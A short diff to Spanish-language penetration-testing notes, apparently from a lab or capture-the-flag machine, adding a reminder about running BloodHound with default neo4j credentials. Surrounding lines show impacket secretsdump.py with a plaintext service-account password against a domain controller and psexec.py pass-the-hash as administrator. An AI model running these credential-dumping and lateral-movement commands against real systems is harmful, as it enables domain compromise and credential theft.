@@ -140,6 +140,10 @@ secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
 conectarse al servidor con hashe
 psexec.py megacorp.local/administrator@10.10.10.30 -hashes <NTML hash>:<NTLM hash>
 
+Nota: siempre se debe correr bloohound de la siguiente manera y desde el usuario kali
+
+bloodhound desde terminal pero no desde tmux ni desde root. con el neo4j/neo4j
+
 ************************************************************Contenedores de linux LXC***********************************
 Contienen un entorno de servicios, entre ellos contienen comandos para poder ejecutar en el sistema operativo:
 
